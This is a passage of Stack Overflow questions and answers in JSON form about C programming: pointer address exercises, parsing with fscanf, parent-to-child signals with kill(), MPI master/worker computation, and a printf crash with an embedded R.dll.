"https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1444864657, "post_id": 33136891, "comment_id": 54086009, "body": "Nice. Learnt how to post &quot;spoiler text&quot; as well!"}], "tags": [], "owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "is_accepted": true, "score": 4, "last_activity_date": 1444863362, "last_edit_date": 1444863362, "creation_date": 1444862560, "answer_id": 33136891, "question_id": 33136730, "link": "https://stackoverflow.com/questions/33136730/memory-addressing-and-pointer-exercises/33136891#33136891", "title": "Memory addressing and pointer exercises", "body": "<blockquote>\n  <p>Assume that variables are placed in memory contiguously in the order they are coded, starting at memory address 0x250</p>\n</blockquote>\n\n<p>Let's follow nneonneo's hint, and \"as a first pass, just allocate the variable addresses just so you know where everything is.\"</p>\n\n<p>This should start you off on the right foot:</p>\n\n<pre><code>int x = 30;               // &amp;x  = 0x250\nint y = 50;               // &amp;y  = 0x252\nint *px = &amp;x;             // &amp;px = 0x254\nint *py = &amp;y;             // &amp;py = 0x256\n</code></pre>\n\n<p>Now a little guidance:</p>\n\n<pre><code>printf(\"a) %x\\n\", px);    // These both print the *value* of the pointers \nprintf(\"b) %x\\n\", py);    // themselves (in other words, the address to which\n                          // they point).\n                          // Note: they're printed in hexadecimal\n                          // (unfortunately with no prefix).\n\npx = py;                  // The *value* of py is assigned to px.\n                          // Now they both point to the same thing.\n\n\nprintf(\"c) %d\\n\", *px);   // This \"de-references\" px. In other words, it\n                          // reads the value at the address px points to.\n\n\nprintf(\"d) %x\\n\", &amp;px);   // This prints the *address* of the pointer px.\n                          // Hint: can this change during program execution?\n\nx = 88;                   // Simple integer assignments\ny = 14;\n\nprintf(\"e) %d\\n\", *px);   // Same logic as c)\n\nprintf(\"f) %d\\n\", *py);   // Same logic as c)\n</code></pre>\n\n<p>Answers (for those who want to check their answers, or cheaters):</p>\n\n<blockquote class=\"spoiler\">\n  <p> a) 250<br/>b) 252<br/>c) 50<br/>d) 254<br/>e) 14<br/>f) 14</p>\n</blockquote>\n"}], "owner": {"reputation": 353, "user_id": 1448063, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/bfb70f66f743c5322975f9c269771796?s=128&d=identicon&r=PG", "display_name": "JPHamlett", "link": "https://stackoverflow.com/users/1448063/jphamlett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 205, "favorite_count": 0, "accepted_answer_id": 33136891, "answer_count": 1, "score": 2, "last_activity_date": 1444863569, "creation_date": 1444861774, "last_edit_date": 1444863569, "question_id": 33136730, "link": "https://stackoverflow.com/questions/33136730/memory-addressing-and-pointer-exercises", "title": "Memory addressing and pointer exercises", "body": "<p>Assume you have a 16 bit machine with 65536 bytes of memory. Ints are 2 bytes. Assume that variables are placed in memory contiguously in the order they are coded, starting at memory address 0x250. Given the following code segment: </p>\n\n<pre><code>int x = 30; \nint y = 50; \nint *px = &amp;x;\nint *py = &amp;y;\n\nprintf(\"a) %x\\n\", px); \nprintf(\"b) %x\\n\", py); \n\npx = py; \nprintf(\"c) %d\\n\", *px); \nprintf(\"d) %x\\n\", &amp;px); \n\nx = 88; \ny = 14;\n\nprintf(\"e) %d\\n\", *px); \nprintf(\"f) %d\\n\", *py); \n</code></pre>\n\n<p>Give the output of each printf statement. </p>\n\n<p>They say to assume the memory addresses are allocated in ascending order.</p>\n\n<p>I got </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>a) 252\nb) 254\nc) 30\nd) 250\ne) 88\nf) 14\n</code></pre>\n\n<p>Are these correct?</p>\n"}, {"tags": ["c", "string", "parsing", "int"], "answers": [{"comments": [{"owner": {"reputation": 345, "user_id": 4725352, "user_type": "registered", "accept_rate": 6, "profile_image": "https://graph.facebook.com/1037833785/picture?type=large", "display_name": "Domien", "link": "https://stackoverflow.com/users/4725352/domien"}, "edited": false, "score": 0, "creation_date": 1444862563, "post_id": 33136734, "comment_id": 54085265, "body": "Awesome . Didn&#39;t know about this method lol. Btw, what happens if the string does not match with the pattern?"}], "tags": [], "owner": {"reputation": 153402, "user_id": 1204143, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/5ca341b160687d99b1317859f91054ee?s=128&d=identicon&r=PG", "display_name": "nneonneo", "link": "https://stackoverflow.com/users/1204143/nneonneo"}, "is_accepted": false, "score": 0, "last_activity_date": 1444861790, "creation_date": 1444861790, "answer_id": 33136734, "question_id": 33136698, "link": "https://stackoverflow.com/questions/33136698/c-format-input-string-to-integer-variables/33136734#33136734", "title": "C - Format input string to integer variables", "body": "<p>Just use <code>fscanf</code>:</p>\n\n<pre><code>FILE *f = fopen(\"file.txt\", \"r\");\nif(!f) {\n    /* file open failed */\n}\nint a, b;\nwhile(fscanf(f, \"%i|%i\", &amp;a, &amp;b) == 2) {\n    /* do something with a and b */\n}\n</code></pre>\n"}], "owner": {"reputation": 345, "user_id": 4725352, "user_type": "registered", "accept_rate": 6, "profile_image": "https://graph.facebook.com/1037833785/picture?type=large", "display_name": "Domien", "link": "https://stackoverflow.com/users/4725352/domien"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 52, "favorite_count": 0, "closed_date": 1444861937, "answer_count": 1, "score": -1, "last_activity_date": 1444861790, "creation_date": 1444861644, "question_id": 33136698, "link": "https://stackoverflow.com/questions/33136698/c-format-input-string-to-integer-variables", "closed_reason": "Duplicate", "title": "C - Format input string to integer variables", "body": "<p>I have a string that looks like \"%i|%i\".\nSome examples: \"52|23\" , \"7|3\" , \"98|6\".</p>\n\n<p>I want to parse this kind of strings to two int variables.\nso \"52|23\" will become a variable.\nint a=52 and int b=23.</p>\n\n<p>These strings are saved in a .txt-file.\nHow can I parse them out and parse them like explained above?</p>\n"}, {"tags": ["c", "signals", "parent-child", "kill", "sigkill"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1444861701, "post_id": 33136624, "comment_id": 54084892, "body": "Do yourself a favour: check the return values from system calls, such as <code>kill()</code>.  They tell you whether the system thinks the call worked or not."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1444861878, "post_id": 33136624, "comment_id": 54084977, "body": "Your child process is exiting as soon as it has installed the signal handler. It does not wait to receive the signal."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1444866398, "post_id": 33136624, "comment_id": 54086446, "body": "<code>printf()</code> is not async-signal-safe and should never be called from a signal handler.  Read the &quot;<b>Async-signal-safe functions</b>&quot; section:  <a href=\"http://man7.org/linux/man-pages/man7/signal.7.html\" rel=\"nofollow noreferrer\">man7.org/linux/man-pages/man7/signal.7.html</a>"}], "answers": [{"comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444861882, "post_id": 33136758, "comment_id": 54084978, "body": "&quot;<i>Try adding <code>sleep(5)</code> ...</i>&quot;  or just call <code>pause()</code>."}], "tags": [], "owner": {"reputation": 13948, "user_id": 283342, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/e3ef6dbec3a443e7cda5b5624311ca08?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/283342/adrian"}, "is_accepted": false, "score": 3, "last_activity_date": 1444861862, "creation_date": 1444861862, "answer_id": 33136758, "question_id": 33136624, "link": "https://stackoverflow.com/questions/33136624/signal-function-not-being-called/33136758#33136758", "title": "Signal function not being called", "body": "<p>The child process exits before the parent process has a chance to send a signal to it. Try adding <code>sleep(5)</code> in the child process after calling <code>signal</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 2, "last_activity_date": 1444862492, "last_edit_date": 1495541673, "creation_date": 1444861884, "answer_id": 33136763, "question_id": 33136624, "link": "https://stackoverflow.com/questions/33136624/signal-function-not-being-called/33136763#33136763", "title": "Signal function not being called", "body": "<p>You child exits before the signal is sent:</p>\n\n<pre><code>  if(pid == 0)\n  {\n    if(signal(SIGUSR1, my_handler))\n    {\n     printf(\"+1\"); \n    }\n  }\n  else if(pid &gt; 0)\n  {\n    sleep(2);\n    kill(pid, SIGUSR1);\n  }\n</code></pre>\n\n<p>The child might print <code>+1</code>, but then it exits.  Meanwhile, your parent waits two seconds to make sure the child is really dead, and then sends it a signal.  It isn't there!</p>\n\n<p><strong>To fix</strong>: Add some sort of code that makes the child hang around to receive the signal.  The simplest is probably <code>pause();</code>, though a <code>sleep()</code> for more than 2 seconds would work.</p>\n\n<p>You should check your system calls.  For example:</p>\n\n<pre><code>if (kill(pid, SIGUSR1) != 0)\n{\n    fprintf(stderr, \"kill(%d) failed: %d %s\\n\", (int)pid, errno, strerror(errno));\n    exit(1);\n}\n</code></pre>\n\n<p>You quickly get fed up with writing 4 lines of code so you end up with a function that reports a system error and exits (using C11 <code>_Noreturn</code>):</p>\n\n<pre><code>void _Noreturn err_syserr(const char *fmt, ...)\n{\n    int errnum = errno;  // Capture it before it changes\n    va_list args;\n    va_start(args, fmt);\n    vfprintf(stderr, fmt, args);\n    va_end(args);\n    if (errno != 0)\n        fprintf(stderr, \"%d: %s\\n\", errnum, strerror(errnum));\n    exit(1);\n}\n</code></pre>\n\n<p>Use:</p>\n\n<pre><code>if (kill(pid, SIGUSR1) != 0)\n    err_syserr(\"kill(%d) failed: \", (int)pid);\n</code></pre>\n\n<p>(Not everyone agrees with printing the error number; you pay your money and take your pick.)</p>\n\n<p>See also <a href=\"https://stackoverflow.com/questions/16891019/how-to-avoid-using-printf-in-a-signal-handler/\">How to avoid using <code>printf</code> in a signal handler?</a>  It isn't a part of your problem, but you should be aware of the issues.</p>\n"}], "owner": {"reputation": 365, "user_id": 4052279, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/c8946b98c1692c0dbc68829b2dc5d105?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Ricci", "link": "https://stackoverflow.com/users/4052279/andrew-ricci"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 627, "favorite_count": 0, "accepted_answer_id": 33136763, "answer_count": 2, "score": 0, "last_activity_date": 1444862492, "creation_date": 1444861310, "question_id": 33136624, "link": "https://stackoverflow.com/questions/33136624/signal-function-not-being-called", "title": "Signal function not being called", "body": "<p>I'm trying to send the child process a blank(SIGUSR1) signal from the parent. As far as I know, I have the signal set up properly. I feel like I am messing up on the Kill() function call. I expect some sort of printed output, but I get nothing. Not from inside the child nor from the signal function itself. </p>\n\n<p>code:</p>\n\n<pre><code>void my_handler(int signum);\n\nint main()\n{\n  pid_t pid;\n\n  if((pid = fork()) == -1)\n  {\n    printf(\"Error on fork().\\n\");\n    exit(1);\n  }\n\n  if(pid == 0)\n  {\n    if(signal(SIGUSR1, my_handler))\n    {\n     printf(\"+1\"); \n    }\n  }\n  else if(pid &gt; 0)\n  {\n    sleep(2);\n    kill(pid, SIGUSR1);\n  }\n\n}\n\nvoid my_handler(int signum)\n{\n    if (signum == SIGUSR1)\n    {\n        printf(\"Received SIGUSR1!\\n\");\n    }\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "static", "parallel-processing", "mpi"], "comments": [{"owner": {"reputation": 73919, "user_id": 44309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iL4TW.png?s=128&g=1", "display_name": "High Performance Mark", "link": "https://stackoverflow.com/users/44309/high-performance-mark"}, "edited": false, "score": 1, "creation_date": 1444893793, "post_id": 33136595, "comment_id": 54094661, "body": "<i>I just have no clue what my professor means</i>  Best ask your professor, surely ?"}], "answers": [{"comments": [{"owner": {"reputation": 566, "user_id": 3495690, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/efc58a00064855e8f5dc5861cd16b21b?s=128&d=identicon&r=PG&f=1", "display_name": "user3495690", "link": "https://stackoverflow.com/users/3495690/user3495690"}, "edited": false, "score": 0, "creation_date": 1446732988, "post_id": 33142244, "comment_id": 54873313, "body": "This may not be <i>precisely</i> the right answer, but it is about as close as you could get with the amount of info I offered (I wasn&#39;t very familiar with MPI at the time I posted the question). Thanks for your help!"}], "tags": [], "owner": {"reputation": 8381, "user_id": 5239503, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/MqgeX.jpg?s=128&g=1", "display_name": "Gilles", "link": "https://stackoverflow.com/users/5239503/gilles"}, "is_accepted": true, "score": 1, "last_activity_date": 1444893580, "last_edit_date": 1495541030, "creation_date": 1444893580, "answer_id": 33142244, "question_id": 33136595, "link": "https://stackoverflow.com/questions/33136595/what-is-the-difference-between-static-computation-and-dynamic-computation-in-mpi/33142244#33142244", "title": "What is the difference between static computation and dynamic computation in MPI?", "body": "<p>I'm not 100% sure of what this \"static\" versus \"dynamic\" computation means in the context of MPI. But since it has been asked to use some master/slave approach, I guess that the \"static\" version might be <em>business as usual</em>, while the \"dynamic\" one might imply the use of <code>MPI_Comm_spawn()</code> as described in the <a href=\"http://www.mpi-forum.org/docs/mpi-3.1/mpi31-report.pdf#section.10.2\" rel=\"nofollow noreferrer\">dynamic process model</a> chapter of the MPI standard.</p>\n\n<p>That said, I find appalling that Master/Slave approaches, which are quite a niche for actual effective MPI parallelisations, are put forward so strongly in many MPI learning curricula. Indeed, I refer you to <a href=\"https://stackoverflow.com/a/32558591/5239503\">my thoughts about that</a> which I wrote a while ago after having answered to too many Master/Slave oriented SO questions.  </p>\n"}], "owner": {"reputation": 566, "user_id": 3495690, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/efc58a00064855e8f5dc5861cd16b21b?s=128&d=identicon&r=PG&f=1", "display_name": "user3495690", "link": "https://stackoverflow.com/users/3495690/user3495690"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 354, "favorite_count": 0, "accepted_answer_id": 33142244, "answer_count": 1, "score": -1, "last_activity_date": 1444893580, "creation_date": 1444861195, "question_id": 33136595, "link": "https://stackoverflow.com/questions/33136595/what-is-the-difference-between-static-computation-and-dynamic-computation-in-mpi", "title": "What is the difference between static computation and dynamic computation in MPI?", "body": "<p>I have been asked to write two <em>MPI</em> programs in c: one that computes <strong>statically</strong> and one that computes <strong>dynamically</strong>. </p>\n\n<p>The objective is to find the integral of an equation (let's say f(x) = x for simplicity) over a given interval using the box method. The problem is simple enough, I just have no clue what my professor means by static computation and dynamic computation. </p>\n\n<p>I should probably add that it has been requested that I use the Master-Worker (otherwise known as Master/Slave) model.</p>\n"}, {"tags": ["c", "r", "dll"], "comments": [{"owner": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444871248, "post_id": 33136486, "comment_id": 54087605, "body": "You do understand that the <i>very official position from R Core</i> is that anything to do with MSVC is <i>unsupported</i>.  R is built with the MinGW toolchain."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444890452, "post_id": 33136486, "comment_id": 54093016, "body": "It doesn&#39;t matters. This is indeed bad design. Even with MinGW any DLL should not export symbol found in the C runtime library."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444890893, "post_id": 33136486, "comment_id": 54093221, "body": "And unfortunately, when the deal comes to postmortem debugging, all MinGW executables became useless. Read more here. <a href=\"http://blog.morlad.at/\" rel=\"nofollow noreferrer\">blog.morlad.at</a> I&#39;ve also tried mentioned there tool cv2pdb, it didn&#39;t help me - just did not generated correct PDB from EXE with standard GCC-generated debug info."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444891154, "post_id": 33136486, "comment_id": 54093346, "body": "Posted bug report to the R Bugzilla <a href=\"https://bugs.r-project.org/bugzilla/show_bug.cgi?id=16565\" rel=\"nofollow noreferrer\">bugs.r-project.org/bugzilla/show_bug.cgi?id=16565</a> Hopefully, they will fix in some later versions. In fact, just need to have manual DEF file and exclude all CRT stuff that may happen in the DLL for some reason (or better, completely exclude CRT stuff)."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444891536, "post_id": 33136486, "comment_id": 54093528, "body": "So MINGW will be my choice when it will be able to generate full-featued PDB files (no matter, only it or in additioan to standard formarts like DWARF) for the executables/DLLs."}, {"owner": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444910222, "post_id": 33136486, "comment_id": 54105148, "body": "R behaves as documented and advertised. You need MinGW. Feel free to post a bug report at Microsoft&#39;s site informing them that their compiler fails to produce proper code from the R sources."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444912428, "post_id": 33136486, "comment_id": 54106581, "body": "@Dirk, of course, you may tell me any &quot;official&quot;-like statements like this, but I don&#39;t care. What I really care of is what we have in really.  What I can see is that function printf() which usually comes from C runtime libary now suddenly comes from R.dll. In my humble opinion, as a Senior software Engineer with 15 years experience in developong backend systems, this is BAD DESIGN. And I have posted the bug report and suggest how to improve/fix this situation. I hope R developers and comminity are highy interested in the making R available and compatible with the mainstream Windows toolchain."}, {"owner": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444913223, "post_id": 33136486, "comment_id": 54107133, "body": "You still don&#39;t get it.  The bug is with the toolchain."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444913795, "post_id": 33136486, "comment_id": 54107564, "body": "@Dirk, I still think including into custom DLL functions that come from CRT DLL is BAD DESIGN. Toolchain doen&#39;t have artificial intelligence and just does what it does as it should. And in my opinion,this is bad design in R.dll, but not in the MS toolchain. Not because I&#39;m trying to defend MS toolchain &quot;positions&quot; over the MINGW or any other toolchain, but just because this is what I think generally bad design - override standard library functions in the custom DLL without special need to do so."}, {"owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "reply_to_user": {"reputation": 329671, "user_id": 143305, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4e96ca7ae02c37e7d940d17997d780e5?s=128&d=identicon&r=PG", "display_name": "Dirk Eddelbuettel", "link": "https://stackoverflow.com/users/143305/dirk-eddelbuettel"}, "edited": false, "score": 0, "creation_date": 1444914195, "post_id": 33136486, "comment_id": 54107874, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/92389/discussion-between-ivan-ukr-and-dirk-eddelbuettel\">continue this discussion in chat</a>."}], "answers": [{"tags": [], "owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "is_accepted": false, "score": 0, "last_activity_date": 1444867559, "creation_date": 1444867559, "answer_id": 33137708, "question_id": 33136486, "link": "https://stackoverflow.com/questions/33136486/program-in-c-compiled-with-embedded-r-dll-crashes-when-calling-standard-c-functi/33137708#33137708", "title": "Program in C compiled with embedded R.dll crashes when calling standard C function fprintf()", "body": "<p>I've came up with followinf solution. Here is my script for the manual generation of import library from R.dll:</p>\n\n<pre><code>:: Read more at the http://stackoverflow.com/questions/9946322/how-to-generate-an-import-library-lib-file-from-a-dll\nsetlocal\ncall \"C:\\Program Files (x86)\\Microsoft Visual Studio 12.0\\VC\\vcvarsall.bat\" amd64\nSET MACHINE=x64\nSET LIBNAME=R\ndumpbin /exports %LIBNAME%.dll &gt; %LIBNAME%.exports\necho LIBRARY R &gt; %LIBNAME%.def\necho EXPORTS &gt;&gt; %LIBNAME%.def\nfor /f \"skip=19 tokens=4\" %%A in (%LIBNAME%.exports) do echo %%A &gt;&gt; %LIBNAME%.def\nstart /wait win32pad.exe %LIBNAME%.def\nlib /def:%LIBNAME%.def /out:%LIBNAME%.lib /machine:%MACHINE%\nendlocal\n</code></pre>\n\n<p>Actually, I have added this</p>\n\n<pre><code>start /wait win32pad.exe %LIBNAME%.def\n</code></pre>\n\n<p>before running lib.exe. This start text editor and allows me to edit DEF file manually and drop away from it all flavors of \"printf\" (there are multiple ones) that should actually go from native toolset's CRT version.</p>\n\n<p>After linking with such adjusted import library the issue have gone.</p>\n\n<p>I hope this will be useful info for the people who aim to embed R into their Windows application.  </p>\n"}], "owner": {"reputation": 2007, "user_id": 1540501, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/JcHkg.jpg?s=128&g=1", "display_name": "ivan.ukr", "link": "https://stackoverflow.com/users/1540501/ivan-ukr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 247, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1444891017, "creation_date": 1444860688, "last_edit_date": 1444891017, "question_id": 33136486, "link": "https://stackoverflow.com/questions/33136486/program-in-c-compiled-with-embedded-r-dll-crashes-when-calling-standard-c-functi", "title": "Program in C compiled with embedded R.dll crashes when calling standard C function fprintf()", "body": "<p>I'm using MSVC2013 Update 5 and import library for R.dll from Revolution R 3.2.2 x64 to compile custom version of Rserve (<a href=\"https://rforge.net/Rserve/\" rel=\"nofollow\">https://rforge.net/Rserve/</a>), which used embdded R.dll. CRT type is multithreaded debug DLL. Program crashes when calling to fprintf(stderr, ...) in a very strange way:</p>\n\n<pre><code>ntdll.dll!RtlRaiseStatus()  Unknown\nntdll.dll!string \"Enabling heap debug options\\n\"()  Unknown\nntdll.dll!RtlEnterCriticalSection() Unknown\nmsvcrt.dll!_lock_file() Unknown\nmsvcrt.dll!putc()   Unknown\nR.dll!000000006c8dd814()    Unknown\nR.dll!000000006c8df8e8()    Unknown\nR.dll!000000006c8e3d74()    Unknown\nR.dll!000000006c8dd00d()    Unknown\nRServe.exe!loadConfig(const char * fn) Line 2113    C\nRServe.exe!main(int argc, char * * argv) Line 4247  C\n[External Code] \n</code></pre>\n\n<p>The code is like this:</p>\n\n<pre><code> if(checkScriptFileName(p) != 0)\n        fprintf(stderr, \"Error: Invalid script file name: '%s'.\\n\", p);\n</code></pre>\n\n<p>According to my understanding, fprintf() should be located in the msvcr120d.dll, but it accesses somehow msvcrt.dll and goes through R.dll.</p>\n\n<p>Did anyone face similar issue? Can you please suggest, what can I do in this case in order to solve the issue? (For those who did not understood what about this question) THE QUESTION IS THAT HOW TO FIX THIS CRASH (which normally should not happen, because I've passed all correct parameters to the fprintf()).</p>\n\n<p>Update: More interesting details - tried to switch to static variant of CRT, got following interesting stuff:</p>\n\n<pre><code>1&gt;  Generating Code...\n1&gt;LIBCMTD.lib(sprintf.obj) : error LNK2005: sprintf already defined in R.lib(R.dll)\n1&gt;LIBCMTD.lib(printf.obj) : error LNK2005: printf already defined in R.lib(R.dll)\n</code></pre>\n"}, {"tags": ["c++", "c", "arduino"], "comments": [{"owner": {"reputation": 7466, "user_id": 2146682, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7120fc7548c43237662da906e3c84f43?s=128&d=identicon&r=PG", "display_name": "MrEricSir", "link": "https://stackoverflow.com/users/2146682/mrericsir"}, "edited": false, "score": 8, "creation_date": 1444859863, "post_id": 33136279, "comment_id": 54084163, "body": "C++ has <b>nothing</b> to do with graphics. You can just as easily build graphical applications in C (see Win32&#39;s GDI+, GTK, etc. etc.)"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 1, "creation_date": 1444860173, "post_id": 33136279, "comment_id": 54084291, "body": "The majority of the Win32 API, portions of which are used for creating GUIs on Windows, is designed primarily for C, but can also be used in other languages that are compatible with C, including C++.  So, more generically, the ability to create GUIs depends on the platform API used by your code, not the language that your code is written in."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1444860350, "post_id": 33136279, "comment_id": 54084365, "body": "And yes, you can use C++ to program an Arduino."}, {"owner": {"reputation": 5541, "user_id": 4367864, "user_type": 